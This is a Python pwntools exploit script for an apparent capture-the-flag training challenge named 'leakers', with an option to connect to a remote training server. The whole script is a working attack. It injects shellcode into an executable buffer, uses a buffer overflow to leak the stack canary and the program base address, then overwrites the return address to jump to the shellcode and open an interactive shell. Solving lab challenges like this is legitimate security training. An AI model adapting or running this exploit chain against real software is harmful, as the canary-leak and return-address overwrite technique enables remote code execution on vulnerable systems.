from pwn import *

CHALL_PATH = "./leakers"
CHALL = ELF(CHALL_PATH)

context.arch="amd64"

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./leakers")
        #put a breakpoint before the read()
        gdb.attach(c, """
        brva *12F9 
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("leakers.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./leakers")

#insert the shellcode in ps1 (executable memory)
name=asm(shellcraft.sh())
c.recvuntil(b'name?\n')
c.sendline(name)

#leak the canary
payload=b'A' * (0x68 + 1) #send more than 100 chars to exploit the buffer overflow
c.recvuntil(b'Echo: ')
c.send(payload)
c.recvuntil(payload) 
#u64 needs 8bytes to work so I add a zero in front
canary = u64(b'\x00' + c.recv(7)) #read the canary
print("Canary:", hex(canary))

#leak the base address
payload = b'A' * (0x68 + 6*8)
c.recvuntil(b'Echo: ')
c.send(payload)
c.recvuntil(payload)
leak = c.recv(6).ljust(8, b'\x00')
CHALL.address = u64(leak) - CHALL.symbols["main"] #set the address so that symbols return the offset
print("ELF base:", hex(CHALL.address))
print("PS1 @:", hex(CHALL.symbols["ps1"]))

#overwrite return address (taking into account canary and frame pointer)
payload = b'A' * (0x68) #overflow the buffer
payload += p64(canary) #insert leaked canary
payload += p64(0) #fill frame pointer (rbp) with dummy value
payload += p64(CHALL.symbols["ps1"]) #overwrite the return address with the address of the shellcode

c.recvuntil(b'Echo: ')
c.send(payload)

c.interactive()






